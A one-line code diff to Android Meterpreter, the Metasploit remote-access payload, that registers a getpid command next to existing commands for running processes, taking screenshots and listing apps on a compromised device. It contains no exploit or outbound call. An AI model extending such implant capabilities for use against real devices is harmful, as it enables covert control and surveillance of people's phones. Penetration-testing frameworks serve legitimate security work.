@@ -134,6 +134,7 @@ public class AndroidMeterpreter extends Meterpreter {
         mgr.registerCommand(CommandId.STDAPI_SYS_PROCESS_EXECUTE, stdapi_sys_process_execute_V1_3.class);
         mgr.registerCommand(CommandId.STDAPI_SYS_PROCESS_CLOSE, stdapi_sys_process_close.class);
         mgr.registerCommand(CommandId.STDAPI_SYS_PROCESS_GET_PROCESSES, stdapi_sys_process_get_processes_android.class);
+        mgr.registerCommand(CommandId.STDAPI_SYS_PROCESS_GETPID, stdapi_sys_process_getpid_android.class);
         mgr.registerCommand(CommandId.STDAPI_UI_DESKTOP_SCREENSHOT, stdapi_ui_desktop_screenshot.class);
         if (context != null) {
             mgr.registerCommand(CommandId.APPAPI_APP_LIST, appapi_app_list.class);
